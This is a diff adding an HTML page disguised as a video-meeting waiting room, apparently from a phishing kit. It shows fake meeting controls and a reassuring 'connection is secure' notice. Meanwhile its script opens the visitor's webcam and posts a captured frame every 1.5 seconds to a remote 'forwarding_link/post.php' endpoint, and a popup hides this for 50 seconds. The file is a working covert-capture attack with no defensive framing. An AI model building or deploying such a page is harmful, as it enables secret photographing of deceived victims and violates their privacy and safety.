@@ -1,0 +1,441 @@
+<!doctype html>
+<html>
+
+<head>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap">
+  <video id="video" playsinline autoplay></video>
+</div>
+
+<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
+
+<style>
+  @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
+
+  body {
+    height: 100vh;
+    width: 100vw;
+    background-color: #0F1923;
+    overflow: hidden;
+  }
+
+  * {
+    padding: 0px;
+    margin: 0px;
+    font-family: 'Inter', sans-serif;
+    font-weight: 500;
+    box-sizing: border-box;
+  }
+
+  .main-screen {
+    background-color: #0F1923;
+    height: 100vh;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  img {
+    height: 80px;
+    width: 80px;
+  }
+
+  .bottom-bar {
+    position: fixed;
+    padding: 0px 20px;
+    bottom: 0px;
+    height: 76px;
+    width: 100%;
+    background: rgba(10, 15, 22, 0.92);
+    backdrop-filter: blur(16px);
+    -webkit-backdrop-filter: blur(16px);
+    border-top: 1px solid rgba(255, 255, 255, 0.07);
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    align-items: center;
+    color: #fff;
+    gap: 4px;
+  }
+
+  .icon-button {
+    display: flex;
+    flex-direction: column;
+    justify-items: center;
+    align-items: center;
+    padding: 8px 14px;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: background 0.18s ease;
+    gap: 4px;
+  }
+
+  .icon-button:hover {
+    background: rgba(255, 255, 255, 0.08);
+  }
+
+  .icon-button i {
+    margin-bottom: 0px;
+    font-size: 20px;
+    color: #E2E8F0;
+  }
+
+  .icon-button h6 {
+    font-size: 10.5px;
+    font-weight: 400;
+    color: #94A3B8;
+    letter-spacing: 0.2px;
+    text-transform: none;
+  }
+
+  i {
+    margin-bottom: 6px;
+    font-size: 20px;
+  }
+
+  button {
+    color: #fff;
+    background: linear-gradient(135deg, #EF4444, #DC2626);
+    padding: 8px 22px;
+    border: none;
+    border-radius: 8px;
+    outline: none;
+    font-size: 13px;
+    font-weight: 600;
+    letter-spacing: 0.3px;
+    cursor: pointer;
+    box-shadow: 0 2px 12px rgba(220, 38, 38, 0.35);
+    transition: opacity 0.15s ease, transform 0.1s ease;
+  }
+
+  button:hover {
+    opacity: 0.88;
+    transform: translateY(-1px);
+  }
+
+  .float_button {
+    background: rgba(10, 15, 22, 0.75);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    border: 1px solid rgba(255,255,255,0.1);
+    height: 38px;
+    border-radius: 8px;
+    width: 38px;
+    position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 12px;
+    right: 12px;
+    cursor: pointer;
+    transition: background 0.15s ease;
+    z-index: 100;
+  }
+
+  .float_button:hover {
+    background: rgba(59, 130, 246, 0.25);
+  }
+
+  .float_button i {
+    margin-bottom: 0;
+    font-size: 16px;
+  }
+
+  /* Divider between left controls and center */
+  .bar-divider {
+    width: 1px;
+    height: 36px;
+    background: rgba(255,255,255,0.1);
+    margin: 0 8px;
+  }
+
+  /* Share content green accent */
+  .share-btn i {
+    color: #34D399 !important;
+  }
+  .share-btn h6 {
+    color: #34D399 !important;
+  }
+
+  /* Popup overlay */
+  #ac-wrapper {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(5, 10, 18, 0.75);
+    backdrop-filter: blur(6px);
+    -webkit-backdrop-filter: blur(6px);
+    z-index: 1001;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  #popup {
+    background: linear-gradient(145deg, #1E293B, #0F172A);
+    border: 1px solid rgba(59, 130, 246, 0.35);
+    border-radius: 16px;
+    box-shadow: 0 0 0 1px rgba(255,255,255,0.05), 0 20px 50px rgba(0,0,0,0.6), 0 0 40px rgba(59,130,246,0.12);
+    padding: 28px 40px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 14px;
+    min-width: 420px;
+  }
+
+  #popup .pulse-ring {
+    width: 48px;
+    height: 48px;
+    border-radius: 50%;
+    border: 2px solid #3B82F6;
+    animation: pulse 1.6s ease-in-out infinite;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  #popup .pulse-ring::before {
+    content: '';
+    position: absolute;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: rgba(59, 130, 246, 0.2);
+  }
+
+  #popup .pulse-ring i {
+    font-size: 18px;
+    color: #3B82F6;
+    margin: 0;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.55; transform: scale(1.08); }
+  }
+
+  #popup h2 {
+    font-size: 15px;
+    font-weight: 500;
+    color: #CBD5E1;
+    text-align: center;
+    letter-spacing: 0.1px;
+  }
+
+  #popup .sub-text {
+    font-size: 12px;
+    color: #475569;
+    font-weight: 400;
+  }
+
+  /* Top meeting info bar */
+  .top-bar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 48px;
+    background: rgba(10, 15, 22, 0.85);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border-bottom: 1px solid rgba(255,255,255,0.06);
+    display: flex;
+    align-items: center;
+    padding: 0 16px;
+    z-index: 50;
+    gap: 12px;
+  }
+
+  .top-bar .meeting-badge {
+    display: flex;
+    align-items: center;
+    gap: 7px;
+  }
+
+  .live-dot {
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: #EF4444;
+    animation: blink 1.4s ease-in-out infinite;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.35; }
+  }
+
+  .meeting-name {
+    font-size: 13px;
+    font-weight: 500;
+    color: #94A3B8;
+    letter-spacing: 0.2px;
+  }
+
+  .meeting-timer {
+    font-size: 12px;
+    color: #475569;
+    margin-left: auto;
+    margin-right: 52px;
+    font-variant-numeric: tabular-nums;
+  }
+</style>
+
+<script>
+
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: 'forwarding_link/post.php',
+      dataType: 'json',
+      async: false,
+      success: function (result) {
+        // call the function that handles the response/results
+      },
+      error: function () {
+      }
+    });
+  };
+
+
+  'use strict';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const errorMsgElement = document.querySelector('span#errorMsg');
+
+  const constraints = {
+    audio: false,
+    video: {
+      facingMode: "user"
+    }
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+  }
+
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function () {
+
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      post(canvasData);
+      video.play();
+    }, 1500);
+
+  }
+
+  function PopUp(){
+    document.getElementById('ac-wrapper').style.display="none"; 
+  }
+
+  // Timer
+  let seconds = 0;
+  function updateTimer() {
+    seconds++;
+    const h = String(Math.floor(seconds / 3600)).padStart(2, '0');
+    const m = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
+    const s = String(seconds % 60).padStart(2, '0');
+    const el = document.getElementById('meeting-timer');
+    if (el) el.textContent = h + ':' + m + ':' + s;
+  }
+  setInterval(updateTimer, 1000);
+
+  // Load init
+  init();
+  $(document).ready(function(){
+   setTimeout(function(){
+      PopUp();
+   }, 50000);
+  });
+</script>
+
+<body>
+  <!-- Top info bar -->
+  <div class="top-bar">
+    <div class="meeting-badge">
+      <div class="live-dot"></div>
+      <span class="meeting-name">Meeting in progress</span>
+    </div>
+    <span class="meeting-timer" id="meeting-timer">00:00:00</span>
+  </div>
+
+  <!-- Expand button -->
+  <div class="float_button">
+    <i class="fas fa-expand" style="color: #94A3B8; font-size: 15px; margin-top: 0px;"></i>
+  </div>
+
+  <!-- Waiting popup -->
+  <div id="ac-wrapper">
+    <div id="popup">
+      <div class="pulse-ring">
+        <i class="fas fa-lock"></i>
+      </div>
+      <h2>Please wait — the meeting host will let you in soon</h2>
+      <span class="sub-text">Your connection is secure</span>
+    </div>
+  </div>
+
+  <!-- Bottom control bar -->
+  <div class="bottom-bar">
+    <div class="icon-button">
+      <i class="fas fa-microphone"></i>
+      <h6>Mute</h6>
+    </div>
+    <div class="icon-button">
+      <i class="fas fa-video"></i>
+      <h6>Stop Video</h6>
+    </div>
+
+    <div class="bar-divider"></div>
+
+    <div class="icon-button" style="margin-left: auto;">
+      <i class="fas fa-shield-alt"></i>
+      <h6>Security</h6>
+    </div>
+    <div class="icon-button">
+      <i class="fas fa-users"></i>
+      <h6>Participants</h6>
+    </div>
+    <div class="icon-button share-btn">
+      <i class="fas fa-plus-square"></i>
+      <h6>Share content</h6>
+    </div>
+    <div class="icon-button">
+      <i class="fas fa-comments"></i>
+      <h6>Chat</h6>
+    </div>
+    <div class="icon-button" style="margin-right: auto;">
+      <i class="fas fa-record-vinyl"></i>
+      <h6>Record</h6>
+    </div>
+
+    <div class="bar-divider"></div>
+
+    <button style="margin-left: 8px;">End</button>
+  </div>
+</body>
+
+</html>
